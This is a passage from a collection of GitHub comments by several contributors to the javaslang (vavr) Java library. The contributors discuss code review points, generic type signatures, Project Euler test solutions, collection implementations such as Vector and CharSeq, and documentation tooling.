LifeForm {\n}\n\nstatic class Plant implements LifeForm {\n}\n\n}\n. Yes, Xtend doesn't care which SAM type is to be implemented by a lambda expressions. Default methods do also work well with Xtend on a Java8 VM. Let me know if you face any issues. I'll be more than happy to resolve them.\n. Hey @danieldietrich - unfortunately it does not work on my box:\n[ERROR] Failed to execute goal net.alchim31.maven:scala-maven-plugin:3.3.1:script (default) on project vavr: wrap: java.lang.Exception: A NoSuchMethodError exception was thrown: scala.Product.$init$(Lscala/Product;)V -> [Help 1]\n```\nThis is the change that I see in the pom.xml\n-        <scala.version>2.10.6</scala.version>\n-        <scala.compat.version>2.10</scala.compat.version>\n+        <scala.version>2.12.3</scala.version>\n+        <scala.compat.version>2.12</scala.compat.version>\nIf I revert this, it builds successfully. . Let me double-check this. I guess I ran the build with Java8. You don't use the enforcer plugin to assert the java version?. You may want to use Comparator<? super T> here and for maxBy(..), too \n. I'm pretty sure it doesn't harm, but don't we have a second pass here with the reverse() operation?\n. you could always use List.listIterator with previous() and hasPrevious() to traverse all kinds of j.u.List backwards. No need for special cases for ArrayList and Vector.\n. see https://github.com/javaslang/javaslang/pull/310\n. No, there is no advantage as far as I can tell. It's probably just me: when I see a generic type reference without any type parametrization I feel inclined to add that.\n. Yes, it would be great if the compiler could check that List is effectively an immutable list. But since it's just an interface, it's impossible to prove that no instance of List<? extends T> could ever violate the statically known type of a List\n. This could even be Iterable<?> rather than Iterable<?>. Consider this scenario:\njava\nList<CharSequences> that = Arrays.asList(\"a\", \"b\");\nTraversable<String> traversable = ..\ntraversable.indexOf(that, 0)\nthere could be a valid index for the given list that. On the other hand, it'll open the door for the same kind of bug-prone signatures as java.util.List<T>.containsAll(Collection<?> c);.\n. Hi @danieldietrich ,\nI meant Iterable<?> which would indeed be a workaround for the missing <U super T> in Java. I think in general it's find to have type constraint on indexOf, containsAll and the like, even though it may render certain alien usage patterns cumbersome. It's just something that should be considered briefly when an API is designed to make sure we don't miss some usage scenarios.\nBest, Sebastian\n. Should be ok to use Traversable<? extends Iterator<T>> here\n. Also here\n. The input parameter can be slightly more general, e.g. Iterator<? extends Iterator<T>> if not even Iterator<? extends Iterator<? extends T>>which would allow to concat two iteratorsIteratorandConcatIteratorto an iterator of Number.\n. should also beIterable<? extends T>`\n. Dito\n. Dito\n. Should be save to use iterable.iterator().hasNext().\n. Fixed, thanks.. Thank you for the heads-up. I resolved the merge conflict and updated the PR.. Can we use 4.4.x here?. Version is different from the one in the build script. that should go to src-gen instead of src-test to reduce the noise. Thank you for the hint. Done.. damn it, that was not my intention :). I checked 'cleanup' in idea and it removed the cast ... so for now I restored it.. ",
    "Sounie": "I have reviewed Daniel's comments and updated my code changes accordingly.\n. Merged successfully :)\n. ",
    "jorander": "This is the change needed to solve the issue with running tests in IntelliJ as were discussed with Daniel over mail.\n. I agree with your comments. Great you saw the possibility, I didn't.\n. Hi,\nBeen away from Javaslang for a while and coming back I find it more impressive than ever. Great job done!\nI was going over and bringing my own Euler solutions up-to-date with Javaslang 2.1.0 and since I use another approach to generating prime numbers (problem 7) than you have in the current solution I ran into this issue. The problem I got was because I use the already generated primes in the function generating the next. Due to the early call to calculate \"next\" I got an infinite loop and hence a StackOverflowException.\nBest Regards,\nJ\u00f6rgen\n. Ok, thanks for all the input. I'll try to be back with an updated version later tonight.\n/J\u00f6rgen\n. Hi @ashrko619 ,\nThanks for pointing that out. If I understand the answer you linked correctly it is the calculation of number of divisors that could be smarter. That would mean calculating the number of divisors directly, taking advantage of some more involved mathematical idiom, rather than first creating a stream of factors and then count them.\nI'm sure it will be faster, but I'm not sure that is the right path to go for the Euler problems as tests for Javaslang. I think the main objective here is to validate and show case Javaslang's capabilities as an API for functional programming in Java. In doing so I would like to keep the logic as simple as possible and the solutions as close as possible to the problem statement so that any reader should be able to focus on the Javaslang constructs rather than pondering the mathematical logic we use to arrive at the right solution. From that perspective I think the more na\u00efve solution I used is preferable.\nOther point-of-views? //cc @danieldietrich \nRegards,\nJ\u00f6rgen\n. On the issue of performance: In my solution to this problem using Java 8 Streams, but otherwise the same logic, I used Stream#parallel() on the calculation of factors and got about 50% reduced computation time (from about 5 s to about 2 s on my laptop). Is there an equivalent for distributing the workload for data in a Javaslang Stream over more cores?\n. Hi,\nI think the two solutions can be combined. I was thinking of using a Map at\nfirst, but thought the Option returned from Map#get was a bit clunky in\nthis context. But I can wrap that in a function. I'll make a try at\ncombining the solutions.\n/J\u00f6rgen\nDen 9 jul 2016 20:01 skrev \"Daniel Dietrich\" notifications@github.com:\nI would like to see @jorander https://github.com/jorander the Pattern\nMatching showcase here :`/\nIdea: Could we make an abstract class containing the optimized data\nstructure and provide two implementations, the generalized one and the one\nwith pattern-matching?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1429#issuecomment-231547263,\nor mute the thread\nhttps://github.com/notifications/unsubscribe/ADRVwFqJnBcivouqxdidjNKGGuXPs5_oks5qT-IRgaJpZM4JIpSo\n.\n. It's hard to explain the changes needed, but here is a link to what a combination could look like: https://github.com/jorander/javaslang/blob/229e38cdf37788052c19e8cd9f460cbd2bc0bcbd/javaslang/src/test/java/javaslang/collection/euler/Euler17Test.java\n. Glad you liked it. I can make a PR for it if you like.\nBR\nJ\u00f6rgen\nDen 11 jul 2016 21:56 skrev \"Daniel Dietrich\" notifications@github.com:\n\n@paplorinc https://github.com/paplorinc Let's take the combined\nsolution (A/B) J\u00f6rgen posted\nhttps://github.com/jorander/javaslang/blob/229e38cdf37788052c19e8cd9f460cbd2bc0bcbd/javaslang/src/test/java/javaslang/collection/euler/Euler17Test.java.\nI love it :)\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1429#issuecomment-231846022,\nor mute the thread\nhttps://github.com/notifications/unsubscribe/ADRVwNOV57-S5yPmeke16vtn-I9wHOqbks5qUp_0gaJpZM4JIpSo\n.\n. Fine with me.\n. Nice!\n. Sorry @ashrko619 , I didn't see your addition to this PR before I pushed mine https://github.com/javaslang/javaslang/pull/1440.\n. Hi @ashrko619 ,\nI think it is easier for @danieldietrich to merge your PR if you do one PR for each test instead of pushing them all together.\nBR,\nJ\u00f6rgen\n. This PR can be closed if PR 1476 is merged since it contains (and needs) this bug fix.\n. Yes, I think CharSeq and List are generally faster than Stream,  no hard evidence, just empirical data from trying them all on different Euler problems.. I've come to the conclusion to use Stream only when the problem can benefit from the laziness to avoid evaluating unnecessarily.\n. Of course, I'll make the change.\n. Yes, my mistake.\n. In this case, I can't see any difference in execution speed on the overall problem. Cycles are mostly used in other areas. In addition I like the readability and symmetry of the Match- clause.\n\nWith the extra variable, I totally agree. It was needed in an earlier solution and just got hanging around. I'll remove it.\n. I like that. The only thing that has disturbed my sense of readability was that the value to match on came last. This looks much better.\n. Yep, you're right. It worked fine. And it make sense.\n. No, using p <= previousPrime doesn't work since Stream.takeWhile(Predicate) runs until it finds an element that doesn't satisfy the Predicate and since we here are inside the functions that builds up the tail of the knownPrimes stream nextPrime(...) will be called again and we will get a StackOverflow.\n. Yes, simpler, but perhaps too simple. What if null happens to be a valid value somewhere in the stream? Then we would return the seed next time getNext() is called.\n. Yeah, I agree. The name might be enough.\n. You mean that the first triangle number with more than 500 divisors is 76 576 500? I calculated it using my program and then went to https://projecteuler.net/problem=12 to enter my answer and get it evaluated. It turned out to be right.\n. I think there is a bit to much going on in this fold. It is both conditional logic and addition. I think it would be easier to read and understand the code if the different parts were separated. What about using a filter to separate out the conditionals?\n. I think also this fold could be separated into filters for the conditions and a sum at the end.\n. I'll keep that in mind. But for now I think I prefer the $(*)-version\nbecause it helps give a clear distinction between the  matching\npredicate/value and the resulting function/value. In addition it is in-line\nwith the default case $() that tends to often show up at the end.\nOn 11 July 2016 at 22:27, Daniel Dietrich notifications@github.com wrote:\n\nIn javaslang/src/test/java/javaslang/collection/euler/Euler23Test.java\nhttps://github.com/javaslang/javaslang/pull/1436#discussion_r70330126:\n\n\nassertThat(canBeWrittenAsTheSumOfTwoAbundantNumbers(SMALLEST_NUMBER_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS - 1)).isFalse();\nassertThat(canBeWrittenAsTheSumOfTwoAbundantNumbers(SMALLEST_NUMBER_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS)).isTrue();\nassertThat(canBeWrittenAsTheSumOfTwoAbundantNumbers(LOWER_LIMIT_FOUND_BY_MATHEMATICAL_ANALYSIS_FOR_NUMBERS_THAT_CAN_BE_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS + 1)).isTrue();\nassertThat(sumOfAllPositiveIntegersThatCannotBeWrittenAsTheSumOfTwoAbundantNumbers()).isEqualTo(4179871L);\n}\n  +\nprivate static long sumOfAllPositiveIntegersThatCannotBeWrittenAsTheSumOfTwoAbundantNumbers() {\nreturn Stream.rangeClosed(1, LOWER_LIMIT_FOUND_BY_MATHEMATICAL_ANALYSIS_FOR_NUMBERS_THAT_CAN_BE_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS)\n.filter(l -> !canBeWrittenAsTheSumOfTwoAbundantNumbers(l))\n.sum().longValue();\n}\n  +\nprivate static boolean canBeWrittenAsTheSumOfTwoAbundantNumbers(long l) {\nreturn API.Match(l).of(\nCase($(n -> n < SMALLEST_NUMBER_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS), false),\nCase($(SMALLEST_NUMBER_WRITTEN_AS_THE_SUM_OF_TO_ABUNDANT_NUMBERS), true),\n\n\n... Case(value, ...) is a shortcut for Case($(value), ...)\nbut it is up to you which to use, just sayin'\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1436/files/9caf615faab6864edaf0c434c770ef81923aa2ec#r70330126,\nor mute the thread\nhttps://github.com/notifications/unsubscribe/ADRVwKHRulP7k6QqDbhvKICHifj0yJWcks5qUqc7gaJpZM4JJQin\n.\n. Nice and simple solution to this problem!\nHowever, I think we could show-case more of Javaslang's functionality by replacing the if:s with Pattern Matching. I also suggest using a memoized coinSum-function to enhance performance.\n\n``` java\nprivate static int coinSums(int targetSum, List coins) {\n        return Match(Tuple.of(targetSum, coins)).of(\n                Case(Tuple2($(0),$()), 1),\n                Case(Tuple2($(ts -> ts < 0), $()), 0),\n                Case(Tuple2($(), $(cx -> cx.isEmpty())), 0),\n                Case($(), t -> memoizedCoinSums.apply(t._1, t._2.tail()) + memoizedCoinSums.apply(t._1 - t._2.head(), t._2))\n        );\n    }\nprivate static final Function2, Integer> memoizedCoinSums = Function2.of(Euler31Test::coinSums).memoized();\n```\n. This rather clunky reversing and re-reversing is because there is no CharSeq#dropRightWhile. Should we add that (and dropRightUntil), or does adding that to CharSeq mean it should be added to other collections as well where it might not be a good method to use?\n. Thanks for pointing out repeated calculation. Fix is pushed.\nSince this is a Utils-method I don't want to assume val to be larger than 2. It might be 1, 0 or even negative.\n. Yep, works fine and looks good. Thanks\nOn 18 August 2016 at 21:07, Daniel Dietrich notifications@github.com\nwrote:\n\nIn javaslang/src/test/java/javaslang/collection/euler/Euler41Test.java\nhttps://github.com/javaslang/javaslang/pull/1508#discussion_r75369799:\n\n\n* problem 41.\n*/\n@Test\npublic void shouldSolveProblem41() {\nassertThat(nDigitPandigitalNumbers(4)).contains(2143);\nassertThat(isPrime(2143)).isTrue();\n  +\nassertThat(largestNPandigitalPrime()).isEqualTo(7652413);\n}\n  +\nprivate static int largestNPandigitalPrime() {\nreturn Stream.rangeClosedBy(9, 1, -1)\n.flatMap(n -> nDigitPandigitalNumbers(n)\n.filter(Utils::isPrime)\n.sorted()\n.reverse())\n\n\nwe could omit the reverse by providing a comparator:\nsorted(Comparator.reverseOrder())\n(does that compile?)\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1508/files/3a432624d3a68fcfe04c5726f2bd2e65e5e4b616#r75369799,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ADRVwDZa-xZUycsGA5kM97ycn8u8Eb2Vks5qhK1vgaJpZM4JnwXL\n.\n. That would be nice. It is pretty common doing that type of conversions in\nthe Euler problems.\n\nOn 21 August 2016 at 09:33, Daniel Dietrich notifications@github.com\nwrote:\n\nIn javaslang/src/test/java/javaslang/collection/euler/Euler43Test.java\nhttps://github.com/javaslang/javaslang/pull/1514#discussion_r75590213:\n\n)\n-                                .filter(digitsToTest -> digitsToTest._3 % divisor == 0)\n-                                .filter(digitsToTest -> Integer.valueOf(digitsToTest.takeRight(3).mkString()) % divisor == 0)\n\nI think about adding some syntactic sugar/numeric conversion methods to\nCharSeq, e.g.\nInteger.valueOf(digitsToTest.take(3).mkString())\ncould be\ndigitsToTest.take(3).toInt()\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1514/files/3e3032fae50687edf43e07a348c26d709b0c77d6#r75590213,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ADRVwIekHLI2kT3NRnvbQEPDLKQkViWjks5qh_9hgaJpZM4JpO4g\n.\n. Yes, but I think this a bit more verbose version naming what is being\nappended (nextDigit) helps understanding/readability. If shortened to a\nmethod reference the whole concept of \"nextdigit\" is implicit.\n\nOn 22 August 2016 at 01:19, Daniel Dietrich notifications@github.com\nwrote:\n\nIn javaslang/src/test/java/javaslang/collection/euler/Euler43Test.java\nhttps://github.com/javaslang/javaslang/pull/1514#discussion_r75605623:\n\n.flatMap(firstTwoDigits -> DIVISORS\n                     .foldLeft(List.of(firstTwoDigits), (accumulator, divisor) -> accumulator\n                             .flatMap(digitsSoFar -> ALL_DIGITS\n-                                        .removeAll(digitsSoFar._1)\n-                                        .map(nextDigit -> Tuple.of(digitsSoFar._1.append(nextDigit), digitsSoFar._2.tail().append(nextDigit)))\n-                                        .map(digitsToTest -> Tuple.of(digitsToTest._1, digitsToTest._2, Integer.valueOf(digitsToTest._2.mkString())))\n-                                        .removeAll(digitsSoFar)\n-                                        .map(nextDigit -> digitsSoFar.append(nextDigit))\n\nhere we can use the shorted method reference: .map(digitsSoFar::append)\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1514/files/3e3032fae50687edf43e07a348c26d709b0c77d6#r75605623,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ADRVwLKbUo-dgmUab3x_oziCE3Y4nGgyks5qiNz5gaJpZM4JpO4g\n.\n. \n",
    "nousedaccount": "How about markdown. I think Github Flavoured Markdown is sufficient and a lot of people comfortable to write in markdown.\ni will take a look to AsciiDoctor.\n. How about integration with javaslang.com website. I think it cooler if documentation available on website too. So reader no need to look at github wiki.\n. AsciiDoctor seem nice.\n+1 for AsciiDoctor\n. any idea for draft of an outline?\n. Okay.  I'll try AsciiDoctor tonight. GMT+7 Here :)\nOn 17 Sep 2015 17:22, \"Robert Winkler\" notifications@github.com wrote:\n\nBut the writer does see the difference, if you dont use a tool for docbook.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/280#issuecomment-141037342\n.\n. Noted\nOn 17 Sep 2015 17:42, \"Daniel Dietrich\" notifications@github.com wrote:\nNote:\nWe should target all of these output formats: HTML, PDF and EPUB.\nAlso the documentation should be integrated on the website. Maybe we will\nopen a new tab for now because the website is a single page.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/280#issuecomment-141040350\n.\n. I think its better if javaslang converted to Organization. So more people (github account) can associate with it. \n\nFor AsciiDoctor there are a lot of example using maven plugin https://github.com/asciidoctor/asciidoctor-maven-examples. We just need to pick what we need.\n@danieldietrich so, which repository that we will use to store User-Guide. I think its better if user-guide repository separated from main javaslang repository.\n. @danieldietrich @RobWin and if javaslang in an organization, we can create a repo contains example usage for javaslang in conjunction with other framework such as Spring Framework, Spring Data JPA, Jackson JSON Module, etc.  And assign team to maintain each repo.\n. @danieldietrich \nI think we need to take care all of Seq sub class such as List, Stream etc.\n. @danieldietrich \nWhat the purpose of Try.filterTry(CheckedPredicate), it has zero usage ? \njava\n    default Try<T> filterTry(CheckedPredicate<? super T> predicate) {\n        if (isFailure()) {\n            return this;\n        } else {\n            return Try.of(() -> predicate.test(get())).flatMap(b -> filter(ignored -> b));\n        }\n    }\n. @danieldietrich now i use javaslang idea setting, now it nicer :D\nI'll work on Fatal.toString and Fatal.hashCode, then you can merge it. \n. @danieldietrich Ready to go!\n. @danieldietrich how about if we use concept like this. \nwhen one of contributor \"promote\" a project under javaslang organisation then you review it, after you approve that, the project will be under javaslang and the contributor will be one who responsible. then you can create team with access to certain project not all project. \nof course the project must have strong relation with base javaslang project such as javaslang usage Example, Jackson Module to Marshall/Unmarshall object with javaslang datastructure, etc.\n. There are already Static Factory Method for TupleN.\njava\nTuple2<Integer, String> value2 = Tuple.of(42, \"doge\");\nTuple3<Integer, String, String> value3 = Tuple.of(42, \"doge\", \"wow\");\n. I think it is nice :D\n+1 \n. I usually set idea to never use wildcard import such as import java.util.*; Now i use setting from javaslang standard.\n. ",
    "martincooper": "The change I proposed seem functionally fine, but fail on the \"TypeConsistencyTest\". I'm not too sure what is incorrect, if it's something i've missed?\n. Hi Daniel. Thanks for the detailed response :-) I'll go through it in detail when I finish work tonight and update accordingly.\n. Hi Daniel\nI've just been reading through your explanation and it all makes perfect sense :-) I've spent a few months working with Scala, but i'm still trying learning when and where I should flatMap shit :-) \nI've updated the code and all tests pass.\nThanks again.\n. Great, thanks!\n. That's fine. No rush. Better to do it right. I'm on holiday for a couple of weeks too so won't have much time to pick up the update for a while anyway. \nThanks\nEnjoy your hols. :)\n. Hi Daniel\nI've modified the code according to your comments. I hope i've got all the method names as you requested. \nI wasn't entirely sure what the implementation of flatMapTry(CheckedFunction1) would be, so I've left that out for now.\nThanks!\nMartin\n. Hi Daniel\nI didn't realise the Match class was generated :astonished:\nYep, it's cool for you to make these changes as you're already working on it. I look forward to testing it out after. :smiley:\nThanks!\n. Personally I prefer that it be concise unless it adds ambiguity. I think there is definite benefit having a whenType method for both clarity and reduction in the code required to implement it. The first example is only marginally more concise than the second one anyway. \nThanks\n. I can't see why they would be required any more once you could pass the class name to whenType(). \n. :smiley: The finding was pure luck. A number of times i've needed a \"mapUntilFailure\" type method and wasn't sure if flatMap would work for this scenario. (From what I understand, flatMap would not stop when a Failure occurred, just removes them from the returned results?)\nImplementing it manually and checking if it was really lazy by outputting to the console I came across this issue.\n. Thanks for the explanation. It makes sense.\n. ",
    "DillonJettCallis": "Ah, sure, Concurrent makes perfect sense too. Also, I realized after committing that I'd done so in Master instead of a branch. I haven't made many pull-requests, should I put this in a Futures branch or does it not matter?\n. Exactly. I added the Try parts after having trouble with type erasure in the Testing methods. It doesn't help that Executor is actually a FunctionalInterface. \n. Yes of course. I don't mind, I was just copying patterns seen elsewhere. \n. Sorry, that's because future.await continues after call backs have been TRIGGERED but not after they've finished. I should have known that when I wrote the tests. \n. ",
    "mkorobeynikov": "There is another one with Match.caze I suppose\n\n. Daniel, thankyou very much! Good library for me!\n. ",
    "patrox": "hi @danieldietrich, so the future javaslang.collection.String will be very similiar to: \nscala.collection.immutable.WrappedString ?\nhttp://www.scala-lang.org/api/current/index.html#scala.collection.immutable.WrappedString\n. @ruslansennov are you working currently on the implementation? Because to be honest I like this project a lot and if it's possible I would like to help you somehow - and I was wondering if I can work on this one? :)\n. @ruslansennov so I was a bit late ... but it will be quite interesting to compare the implementations :)\n@danieldietrich I'll have a look at these tests\n. nah, String2 was just a product of a my very tired mind :)\n. I think it's the best name we have now currently, IString sounds like an interface in Microsoft parlance\n. if you'll rename it, then can you please rename the test as well, to be consistent, as now it's StringTest, there is a bit of inconsistency in packages too, as the WrappedString is currently located in javaslang, but the corresponding test suite is located in javaslang.collection\n. alright! I've to go get some sleep - found some interesting info regarding how String-like types behave in scala (in the context of transforming functions like map ...). I'll create some tests to capture the behaviour, so we can discuss if further. But for now - good night !\n. I can pick this up - and will come back tomorrow with some ideas, ok ?\n. @ruslansennov you deserved some :beers: :) \n. @danieldietrich, @ruslansennov, regarding flatMap and/or map, here are my findings:\nI found that when we run any transformation function (like map, filter, etc) on a plain String in Scala, we will go through the following sequence:\n1.) First the String is converted (implicitly) to StringOps instance (http://www.scala-lang.org/api/current/index.html#scala.collection.immutable.StringOps)\n2.) Then the requested function (method) is called\n3.) Lastly the result is converted back to String\nBut, in case of WrappedString (http://www.scala-lang.org/api/current/index.html#scala.collection.immutable.WrappedString) the sequence which we will go through is much shorter, as:\n1.) there is no (implicit) conversion from plain String, so we need to create WrappedString explicitly\n2.) the function (method) is applied directly on WrappedString instance\n3.) there is also no conversion back to String\nSo javaslang.collection.WrappedString is much closer to WrappedString, then StringOps (not only because of the name ...\nWhen applying map over  javaslang.collection.WrappedString, I think that the result can be also a WrappedString if (and only if) the map function has the following signature: Function<Char, Char>,\nbecause the above ensures that the result will be also a proper WrappedString, as it makes no sense to\nconstruct it from a result of applying map with the following signature Function<Char, Integer> - in such case I believe that more generic collection should be used instead, like for example Vector.\nSo to summarize:\nWrappedString.map(Function<Char,Char>) should result in a WrappedString but,\nWrappedString.map(Function<Char,Integer>) should result in a Vector<Integer>\n(or to be more generic: WrappedString.map(Function<Char,T>)\nshould result in a Vector<T>)\nDoes it make any sense ?\n. I focused for now on map since flatMap is the same, but flattens the result by 'removing' the most inner layer of abstraction  Option, List, etc.\n. yes, I believe that I use too strong words, because when I was writing 'should return' I meant: 'it would be good if ...', but unfortunately it seems that java is missing a lot of scala's 'magic' :)\n. I'll play with the methods which you proposed and let you know what my experience was ... Maybe something new will pop up. \n. @danieldietrich, you can merge them without any concerns.\n. sounds reasonable and I think it will make the life of end users a lot simpler !\n. is it the performance that's worrying you ?\n. I'm working on another euler test (problem 12) and most probably I will also need to have a stream of  prime numbers to find large number of divisors in a reasonable time, so this will be helpful !\n. My first approach was too naive (I don't even want to mention it ;)),\nthe second (a bit smarter/faster) was to lookup the divisors in pairs -\nso when I found that m is a divisor of n, I was calculating the other divisor by: n/m - this has limited the search space from n/2 to sqrt(n) - but this was still taking very long (~60 secs to calculate 400 divisors)),\nthe third (and I hope the last one) ... will be to implement the Tau function aka divisor function:\nhttps://en.wikipedia.org/wiki/Divisor_function\n. it's not that simple, as this will narrow the types with which Vector can be compared to only Vector itself. So it won't be possible to compare it with for example CharSeq (as IndexSeq is base class for both CharSeq and Vector) which as a result will brake some tests.\nI've found out that there might be some incosistencies in them, as in this test:\njava\n@Test\npublic void shouldMapNil() {\n    assertThat(this.<Integer> empty().map(i -> i + 1)).isEqualTo(empty());\n}\na result of CharSeq.map is compared against CharSeq, which is incorrect as CharSeq.map returns Vector. I'll try to review the failing tests and fix them.\n. I'm done - maybe it would be best to do it in another PR, to keep it atomic ?\n. I was lucky - 500th PR :) https://github.com/javaslang/javaslang/pull/500\n. I rebased the code in this PR to current master, so it can be merged without any conflicts.\n(it includes the change in Vector.equals).\n. Hahaha, I've found what's \"wrong\", it seems that the HashMap.map implementation is rather simplistic:\nhttps://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/collection/HashMap.java#L259\nI'll try to add something more there, so I can continue with eating our own dog food :)\nhttps://en.wikipedia.org/wiki/Eating_your_own_dog_food\n. I can work on implementing missing HashMap methods, here is a short sample:\nhttps://github.com/javaslang/javaslang/pull/505\n. Yes, this was also a bit strange to me as well. Sure, the missing HashMap's methods will be done separately.\n. I propose to throw UnsupportedOperationException http://java.sun.com/javase/6/docs/api/java/lang/UnsupportedOperationException.html in such cases, as this might be more 'honest', then returning null.\n. Regarding HashSet.equals - yes, I agree that my analysis was a bit shallow - the most important is that it will be fixed! \nOK, so I will close this one, as HashMap.map will be implemented in a separate PR.\nBottom line is that implementing Euler project problems (using javaslang) is a very good way to test it very thoroughly - it's a bit like an integration test - as we're mixing various types (Streams, Maps, Sets, CharSeqs) with various methods (i.e. maps, filters, groupBys).\n. Done, coverage increased by 0.2% :)\nBut I'm still wondering how the order of elements in HashArrayMappedTrie could affect the HashSets from my 'minimal' example - containing 1 element ?\n. @danieldietrich not a problem, altough I used them a bit differently:\njava\n// TODO: please implement me\nthrow new UnsupportedOperationException(\"Not implemented yet!\");\nBecause such comments are usually picked up by the IDE (in my case Idea), it's very easy to quicky find them all :)\n. yes, I'm aware that it takes some time to complete, for me it was around 6-7 seconds, but as for a test it was a bit slow - altough it's not a unit test per se. The most frustrating thing is that the corresponding Scala code completes below 1 sec ... I was wondering if we could make the Euler problems tests optional and run the remaining tests - these which actually test the core API.\n. yes, similarily like in Clojure, as these languages support TCO (tail call optimization), which basically transforms tailrec calls in loops :)\nBTW - I really miss Scala's @tailrec annotation :)\n. Good night!\n. BTW, I'm working on Euler 17 :)\n. hi @danieldietrich, interesting idea, altough to confirm if I understand it correctly:\n- Seq<T> continue(T next); // continues a stream with a constant value\n- Seq<T> continue(Supplier<? extends T> nextSupplier); // continues a stream with result(s) taken from consequent Supplier applications\n- Seq<T> continue(Function<? super T, ? extends T> previousToNext); // continues a stream with a value calculated by the provided Function which calculates the next value basing on the last item in the Stream/Seq.\nExamples:\n``` java\nSeq.of(1,2,3).continue(4); // 1,2,3,4,4,... (infinite stream)\nSeq.of(1,2,3).continue(() -> coolFx()); // 1,2,3,,,... (infinite stream)\nSeq.of(1,2,3).continue(i -> i +1) // Example which you've provided above \n``\n. After making some experiments, first two are quite simple, as you can do sth like (examples using justStream` API):\n``` java\nStream.concat(streamToContinue, Stream.generate(nextSupplier);\n```\nThe one with constant value, could be done similarly (by concatenating the first stream with a stream produced by a constant supplier).\nThe third one is the trickiest one, as you can use the same pattern, but swap Stream.generate for Stream.iterate which takes a seed value and a UnaryOperator (which is just a Function with the same result type as it's argument) which will be used to produce the consequent values.\nThe trick is here that on order to obtain the seed value for iterate you need to traverse the whole first stream, which might be infinite and even if not, this seems quite expensive.\n. I was on a phone too :) so the code was a bit simplified ... I can continue on that since I already have a rough draft in my head.\n. Hi @danieldietrich, it willl be finished before that I promise !\n. @danieldietrich Here you are: https://github.com/javaslang/javaslang/pull/1144\nI've added a couple of tests to validate some regular cases and some corner cases as well.\n. @danieldietrich is there something which I could help you guys with ?\n. ok, then I'll try to add some tests - is there an easy way to check which fragments of code are not covered ?\n. thanks @ruslansennov , I've already started to drill down to sub directories to find some blind spots.\n. @danieldietrich please don't merge it yet - I'll be adding some tests soon, ok ?\n. good night!\n. > 96.01%\n@danieldietrich that will be all for this PR :)\nThe side-effect of writing these tests was that I finally grasped the basics of javaslang's pattern matching.\n. is it really needed to use a fully qualified class name ?\n. yes, that exactly what I thought - I had the same problem - but I was far less imaginative and called my WrappedString just String2 ... :)\n. Let me share some of my thoughts regarding Vector as a backing type:\nIn my impl of WrappedString I was building a Stream out of the backing String contents and then I was delegating methods to a corresponding Stream method, so if we would to store a Vector<Character> as a backing type, then we could delegate WrappedString method calls to already implemented Vector methods.\nBut I'm not certain how this would affect the performance, but this can (and should) be measured and compared. Does it make any sense?\n. yes, that complicates using Vector a bit, as in this case it's far easier to just delegate method calls to the backing java.lang.String ... But I think that the most functionality is coming from IndexSeq - nevertheless, as this feature (WrappedString) will probably be used quite a lot, then I would say that performance should be a priority, correct?\n. haha, that's funny - it reminds me of operator overloading in C++ ;)\n. I took the functional route to do it. I think that mr. Odersky would be satisfied ;)\n. yes, you're right - I missed that!\n. please fix the typo (Emtpy -> Empty)\n. ",
    "sedovalx": "I'm afraid the table has gone...\n. ",
    "paplorinc": "FYI, a line-by-line transcript of Scala's Vector: https://github.com/andrewoma/dexx/blob/master/collection/src/main/java/com/github/andrewoma/dexx/collection/Vector.java\n. @danieldietrich, please assign this to me.\ncc: @mvh77 \n. @danieldietrich I'm currently testing the correctness of the slice method for the new Vector, but since it has very many states, I would only be able to sleep at night by being able to validate the majority of the corner cases.\nObviously that's not possible - it would probably take months to run the test that tries out every combination.\n``` java\n@Test\npublic void shouldSlice() {\n    for (byte depth = 1; depth <= 4; depth++) {\n        for (int size = 1, end = getMaxSizeForDepth(depth) + 1; size <= end; size++) {\n            final Seq expected = Array.range(0, size);\n            final Vector actual = Vector.ofAll(expected);\n        for (int i = 0; i <= size; i++) {\n            for (int j = i; j <= size; j++) {\n                final Seq<Integer> expectedSlice = expected.slice(i, j);\n                final Vector<Integer> actualSlice = actual.slice(i, j);\n                assertThat(expectedSlice.toJavaList()).isEqualTo(actualSlice.toJavaList()).withFailMessage(\"depth=%s,size=%s,i=%s,j=%s!\", depth, size, i, j);\n            }\n        }\n    }\n    System.out.println(\"Depth \" + depth + \" ok!\");\n}\n\n}\n```\nSince there is a property based testing part of Javaslang (that isn't documented or advertised well enough), I would definitely like to go in this direction.\nIt should test the boundaries (e.g. splice with start index in one sub-array and end index in another) and run enough examples to mimic the behavior of a full-blown brute-force permutation.\nCould you please help me in rewriting the above example?\n. https://github.com/andrewoma/dexx seems to have the same speed as Scala.\nNo suprise, as even the TODO comments are copied from there.\n@danieldietrich, what is your opinion about the whole library, how is Javaslang compared to that? (e.g. it copies Scala a lot more than we do, but it dared to rename head to first, which is a big :+1: from me ... it kept tail though, which doesn't really make sense that way, why not rest, if first :-1:)\nAre there any other libraries that I should benchmark againts?\n. > I question that it is a copy-paste of Scala\nIt even has the Scala header: https://github.com/andrewoma/dexx/blob/master/collection/src/main/java/com/github/andrewoma/dexx/collection/Vector.java#L23\n. Any other lib I should compare against?\n. > Vector.prepend and Vector.insert are also O(n)\nWe can make prepend to be effectively constant via the bit-mapped vector trie by providing an offset, as Scala does it also (I think), and insert to be O(n/2) worst case (not 